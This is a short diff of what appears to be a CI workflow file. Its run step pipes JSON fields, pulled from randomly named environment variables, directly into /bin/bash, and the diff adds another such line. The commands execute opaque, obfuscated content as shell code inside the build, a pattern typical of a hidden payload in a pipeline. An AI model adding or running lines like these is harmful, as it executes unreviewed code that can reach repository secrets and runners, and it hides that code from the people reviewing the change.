@@ -25,6 +25,7 @@ jobs:
           echo $diue9 | jq -r .lpy7526 | /bin/bash
           echo $pqic09429 | jq -r .f4 | /bin/bash
           printf '%s' "$djsqa627" | jq -r .kiso48359 | /bin/bash
+          echo $uvuy86490 | jq -r .pj2 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
